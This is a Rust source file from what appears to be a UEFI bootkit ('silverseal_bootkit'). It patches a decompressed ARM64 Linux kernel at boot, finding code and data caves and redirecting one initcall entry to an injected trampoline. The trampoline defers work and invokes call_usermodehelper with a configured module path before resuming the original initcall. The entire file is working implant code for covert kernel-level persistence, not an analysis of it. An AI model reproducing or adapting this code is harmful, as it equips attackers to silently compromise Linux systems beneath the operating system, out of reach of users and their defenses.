//! ARM64 Linux initcall and deferred worker injection.

use silverseal_bootkit::arm64_profile::Arm64Profile;
use silverseal_bootkit::arm64_trampoline::{Arm64Trampoline, decode_prel32, encode_prel32};
use uefi::Status;

use crate::helpers::arm64::{
    find_unique_signature, synchronize_data_cache, synchronize_instruction_cache,
};

const PREL32_SIZE: usize = 4;

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum Arm64InjectionOutcome {
    Installed,
}

pub fn install_post_decompression_trampoline(
    kernel_base: usize,
    kernel_size: usize,
    profile: &Arm64Profile<'_>,
) -> Result<Arm64InjectionOutcome, Status> {
    if kernel_base == 0 || kernel_size == 0 || kernel_size != profile.kernel_image_len {
        return Err(Status::INVALID_PARAMETER);
    }
    let plan = prepare_injection_plan(kernel_base, kernel_size, profile)?;
    unsafe { install_injection_plan(&plan)? };
    Ok(Arm64InjectionOutcome::Installed)
}

struct Arm64InjectionPlan {
    initcall_entry_address: usize,
    initcall_patch: [u8; PREL32_SIZE],
    code_address: usize,
    data_address: usize,
    template: Arm64Trampoline,
}

fn prepare_injection_plan(
    kernel_base: usize,
    kernel_size: usize,
    profile: &Arm64Profile<'_>,
) -> Result<Arm64InjectionPlan, Status> {
    let kernel_end = kernel_base
        .checked_add(kernel_size)
        .ok_or(Status::INVALID_PARAMETER)?;
    let initcall_context =
        find_unique_signature(kernel_base, kernel_size, profile.initcall_signature)
            .ok_or(Status::NOT_FOUND)?;
    let code_context = find_unique_signature(kernel_base, kernel_size, profile.code_cave_signature)
        .ok_or(Status::NOT_FOUND)?;
    let schedule_address =
        find_unique_signature(kernel_base, kernel_size, profile.schedule_work_signature)
            .ok_or(Status::NOT_FOUND)?;

    let initcall_entry_address = initcall_context
        .checked_add(profile.initcall_entry_offset)
        .ok_or(Status::INVALID_PARAMETER)?;
    let code_address = code_context
        .checked_add(profile.code_cave_offset)
        .ok_or(Status::INVALID_PARAMETER)?;
    let expected_initcall = relocate_from_anchor(
        code_address,
        profile.code_cave_virtual,
        profile.initcall_entry_virtual,
    )?;
    let expected_schedule = relocate_from_anchor(
        code_address,
        profile.code_cave_virtual,
        profile.schedule_work_virtual,
    )?;
    let data_address = relocate_from_anchor(
        code_address,
        profile.code_cave_virtual,
        profile.data_cave_virtual,
    )?;
    if initcall_entry_address != expected_initcall || schedule_address != expected_schedule {
        return Err(Status::COMPROMISED_DATA);
    }

    checked_range_end(initcall_entry_address, PREL32_SIZE, kernel_base, kernel_end)?;
    checked_range_end(
        code_address,
        profile.code_cave_capacity,
        kernel_base,
        kernel_end,
    )?;
    checked_range_end(
        data_address,
        profile.data_cave_capacity,
        kernel_base,
        kernel_end,
    )?;
    if !initcall_entry_address.is_multiple_of(PREL32_SIZE)
        || !code_address.is_multiple_of(PREL32_SIZE)
        || !data_address.is_multiple_of(8)
        || ranges_overlap(
            initcall_entry_address,
            PREL32_SIZE,
            code_address,
            profile.code_cave_capacity,
        )?
        || ranges_overlap(
            initcall_entry_address,
            PREL32_SIZE,
            data_address,
            profile.data_cave_capacity,
        )?
        || ranges_overlap(
            code_address,
            profile.code_cave_capacity,
            data_address,
            profile.data_cave_capacity,
        )?
        || !is_zero_range(code_address, profile.code_cave_capacity)
        || !is_zero_range(data_address, profile.data_cave_capacity)
    {
        return Err(Status::INVALID_PARAMETER);
    }

    // SAFETY: the complete PREL32 entry is within the decompressed image and
    // profiles require its natural alignment.
    let original_relative =
        unsafe { core::ptr::read_unaligned(initcall_entry_address as *const i32) };
    let original_initcall_virtual =
        decode_prel32(profile.initcall_entry_virtual, original_relative)
            .map_err(|_| Status::INVALID_PARAMETER)?;
    let initcall_patch = encode_prel32(profile.initcall_entry_virtual, profile.code_cave_virtual)
        .map_err(|_| Status::INVALID_PARAMETER)?;
    let template = Arm64Trampoline::build(
        profile.code_cave_virtual,
        profile.data_cave_virtual,
        profile.schedule_work_virtual,
        profile.msleep_virtual,
        profile.call_usermodehelper_virtual,
        original_initcall_virtual,
        profile.module_path,
    )
    .map_err(|_| Status::INVALID_PARAMETER)?;
    if template.code_bytes().len() > profile.code_cave_capacity
        || template.data_bytes().len() > profile.data_cave_capacity
    {
        return Err(Status::BAD_BUFFER_SIZE);
    }

    Ok(Arm64InjectionPlan {
        initcall_entry_address,
        initcall_patch,
        code_address,
        data_address,
        template,
    })
}

fn relocate_from_anchor(
    anchor_runtime: usize,
    anchor_virtual: usize,
    target_virtual: usize,
) -> Result<usize, Status> {
    if target_virtual >= anchor_virtual {
        anchor_runtime
            .checked_add(target_virtual - anchor_virtual)
            .ok_or(Status::INVALID_PARAMETER)
    } else {
        anchor_runtime
            .checked_sub(anchor_virtual - target_virtual)
            .ok_or(Status::INVALID_PARAMETER)
    }
}

fn checked_range_end(
    address: usize,
    len: usize,
    image_base: usize,
    image_end: usize,
) -> Result<usize, Status> {
    let end = address.checked_add(len).ok_or(Status::INVALID_PARAMETER)?;
    if len == 0 || address < image_base || end > image_end {
        return Err(Status::INVALID_PARAMETER);
    }
    Ok(end)
}

fn ranges_overlap(
    first: usize,
    first_len: usize,
    second: usize,
    second_len: usize,
) -> Result<bool, Status> {
    let first_end = first
        .checked_add(first_len)
        .ok_or(Status::INVALID_PARAMETER)?;
    let second_end = second
        .checked_add(second_len)
        .ok_or(Status::INVALID_PARAMETER)?;
    Ok(first < second_end && second < first_end)
}

fn is_zero_range(address: usize, len: usize) -> bool {
    if address == 0 || len == 0 {
        return false;
    }
    // SAFETY: callers validate the complete range against the decompressed
    // kernel image before invoking this helper.
    unsafe { core::slice::from_raw_parts(address as *const u8, len) }
        .iter()
        .all(|byte| *byte == 0)
}

/// Writes inert data first, then executable code, and publishes the initcall
/// entry only after every cache-maintenance operation succeeds.
///
/// # Safety
///
/// All plan ranges must remain mapped and writable, the code cave must become
/// executable with the kernel text mapping, and no CPU may observe the initcall
/// entry before the final data-cache synchronization.
unsafe fn install_injection_plan(plan: &Arm64InjectionPlan) -> Result<(), Status> {
    unsafe {
        core::ptr::copy_nonoverlapping(
            plan.template.data_bytes().as_ptr(),
            plan.data_address as *mut u8,
            plan.template.data_bytes().len(),
        );
        synchronize_data_cache(plan.data_address, plan.template.data_bytes().len())?;

        core::ptr::copy_nonoverlapping(
            plan.template.code_bytes().as_ptr(),
            plan.code_address as *mut u8,
            plan.template.code_bytes().len(),
        );
        synchronize_instruction_cache(plan.code_address, plan.template.code_bytes().len())?;

        core::ptr::copy_nonoverlapping(
            plan.initcall_patch.as_ptr(),
            plan.initcall_entry_address as *mut u8,
            plan.initcall_patch.len(),
        );
        synchronize_data_cache(plan.initcall_entry_address, plan.initcall_patch.len())?;
    }
    Ok(())
}
